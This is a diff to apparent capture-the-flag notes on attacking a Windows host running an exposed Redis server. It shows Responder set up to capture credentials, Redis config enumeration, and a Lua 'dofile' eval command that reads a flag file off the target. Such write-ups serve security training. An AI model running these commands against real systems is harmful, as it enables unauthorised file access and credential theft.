@@ -9,9 +9,20 @@ For that, we first set up a listener using Impacket's Responder.py
 -------------------------------------------------------------------
 #sudo responder -I tun0
 
-We can use luna script(dofile) with eval command to know information
----------------------------------------------------------------
-#redis-cli -h 10.10.245.19 eval "dofile('C:\\Windows\\Users\\enterprise-security\\user.txt')" 0
+6379/tcp  open  redis (redis port is open)
+
+
+To find all configs in redis
+----------------------------
+
+#redis-cli -h 10.10.245.19
+10.10.245.19:6379> config get * 
+
+We foudn the directory > "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
+
+To retrieve information from redis We can use luna script(dofile) with eval command 
+------------------------------------------------------------------------------------
+#redis-cli -h 10.10.245.19 eval "dofile('C:\\\\Users\\\\enterprise-security\\\\user.txt')" 0   ( because it filters the \\ )
 
 Then, we use the redis eval technique to access the exposed share.
 ------------------------------------------------------------------
